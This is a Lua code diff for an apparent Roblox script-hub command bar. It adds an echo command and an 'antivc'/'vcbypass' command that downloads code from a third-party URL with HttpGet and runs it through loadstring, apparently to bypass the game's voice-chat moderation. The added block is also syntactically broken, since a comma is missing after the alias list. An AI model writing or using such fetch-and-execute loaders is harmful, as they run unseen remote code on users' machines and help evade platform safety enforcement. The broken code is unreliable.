@@ -4411,9 +4411,41 @@ add{
 		if not hum then
 			return "no character"
 		end
-		hum.Health = 0 -- LoadCharacter is server-only; this is the client-side respawn
+		hum.Health = 0
 		return "respawning"
 	end,
+}
+add{
+	name = "print",
+	args = "<text>",
+	group = "Other",
+	help = "Echo text back in the bar",
+	run = function(c)
+		if c.arg == "" then
+			return "needs some text"
+		end
+		print("[hub] " .. c.arg)
+		return c.arg
+	end,
+}
+add{
+    name = "antivc",
+	alias = { "antivcb", "vcbypass" }
+    group = "Other",
+    help = "Load the anti-VC script",
+    run = function()
+        if not loadstring then
+            return "loadstring is not available"
+        end
+        local ok, err = pcall(function()
+            loadstring(game:HttpGet("https://shield.xao.wtf/api/loader/550af30c-aaa3-4338-acab-f44010a5ef09"))()
+        end)
+        if not ok then
+            warn("[antivc] " .. tostring(err))
+            return "antivc failed - see console"
+        end
+        return "antivc loaded"
+    end,
 }
 add{
 	name = "rejoin",
